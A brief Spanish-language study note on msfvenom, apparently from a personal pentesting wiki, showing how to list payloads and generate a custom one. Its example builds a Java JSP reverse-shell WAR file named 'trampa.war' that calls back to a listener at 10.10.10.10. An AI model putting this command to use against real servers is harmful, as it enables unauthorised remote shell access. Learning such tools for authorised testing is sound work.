## ¿Para qué sirve?

Crear un [[Payload]] personalizado.

## Encontrar Payloads

`msfvenom -l payloads`

Existe otra variante para buscar por aquellos Payloads que funcionen con, por ejemplo, [[Java]], [[PHP]]...

`msfvenom -l payloads | grep java`

## Creando Payload personalizado

`msfvenom -p PayloadName LHOST=nuestraDireccionIP LPORT=puertoQueQueramos -f extensiónDeArchivo -o name`

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=44 -f war -o trampa.war`

